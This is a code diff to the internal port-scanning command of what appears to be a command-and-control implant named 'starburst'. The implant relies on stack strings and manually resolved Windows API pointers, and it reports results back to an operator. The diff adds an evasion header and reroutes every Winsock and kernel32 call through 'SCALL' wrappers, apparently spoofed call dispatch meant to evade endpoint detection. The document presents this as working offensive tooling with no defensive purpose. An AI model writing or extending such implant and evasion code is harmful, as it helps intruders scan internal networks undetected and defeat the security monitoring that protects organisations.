@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_PORTSCAN
 
@@ -104,7 +105,7 @@ auto declfn starburst::cmd_portscan(
 
     // load ws2_32.dll
     STK_WS2_32(_n);
-    auto h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_ws2 = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
     if ( !h_ws2 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary ws2_32 failed" ) ) );
@@ -143,7 +144,7 @@ auto declfn starburst::cmd_portscan(
 
     WSADATA_ wsa_data;
     memory::zero( &wsa_data, sizeof(wsa_data) );
-    if ( pWSAStartup( 0x0202, &wsa_data ) != 0 ) {
+    if ( (int)SCALL_PTR( inst, pWSAStartup, 0x0202, &wsa_data ) != 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "WSAStartup failed" ) ) );
         return;
@@ -195,7 +196,7 @@ auto declfn starburst::cmd_portscan(
     uint32_t out_cap = 16384;
     auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
     if ( !output ) {
-        pWSACleanup();
+        SCALL_PTR( inst, pWSACleanup );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -208,18 +209,18 @@ auto declfn starburst::cmd_portscan(
 
     // scan
     for ( uint32_t h = 0; h < host_count; h++ ) {
-        unsigned long addr = pInetAddr( host_list[h] );
+        unsigned long addr = (unsigned long)SCALL_PTR( inst, pInetAddr, host_list[h] );
         if ( addr == 0xFFFFFFFF ) continue;
 
         for ( uint32_t p = 0; p < port_count; p++ ) {
             if ( port_list[p] == 0 ) continue;
 
-            uintptr_t sock = pSocket( AF_INET_, SOCK_STREAM_, IPPROTO_TCP_ );
+            uintptr_t sock = (uintptr_t)SCALL_PTR( inst, pSocket, AF_INET_, SOCK_STREAM_, IPPROTO_TCP_ );
             if ( sock == (uintptr_t)(~0) ) continue;
 
             // set non-blocking
             unsigned long mode = 1;
-            pIoctlsocket( sock, FIONBIO_, &mode );
+            SCALL_PTR( inst, pIoctlsocket, sock, FIONBIO_, &mode );
 
             SOCKADDR_IN_ sa;
             memory::zero( &sa, sizeof(sa) );
@@ -227,7 +228,7 @@ auto declfn starburst::cmd_portscan(
             sa.sin_port   = pHtons( port_list[p] );
             sa.sin_addr   = addr;
 
-            pConnect( sock, &sa, sizeof(sa) );
+            SCALL_PTR( inst, pConnect, sock, &sa, sizeof(sa) );
 
             // use select to wait for connection
             FD_SET_ write_set;
@@ -244,7 +245,7 @@ auto declfn starburst::cmd_portscan(
             tv.tv_sec  = timeout_ms / 1000;
             tv.tv_usec = ( timeout_ms % 1000 ) * 1000;
 
-            int sel_ret = pSelect( 0, nullptr, &write_set, &except_set, &tv );
+            int sel_ret = (int)SCALL_PTR( inst, pSelect, 0, nullptr, &write_set, &except_set, &tv );
 
             bool is_open = false;
             if ( sel_ret > 0 && write_set.fd_count > 0 ) {
@@ -261,7 +262,7 @@ auto declfn starburst::cmd_portscan(
                 if ( in_write && !in_except ) is_open = true;
             }
 
-            pClosesocket( sock );
+            SCALL_PTR( inst, pClosesocket, sock );
 
             if ( is_open && off + 128 < out_cap ) {
                 open_count++;
@@ -291,7 +292,7 @@ auto declfn starburst::cmd_portscan(
 
     output[off] = '\0';
 
-    pWSACleanup();
+    SCALL_PTR( inst, pWSACleanup );
 
     if ( open_count == 0 ) {
         inst.heap_free( output );
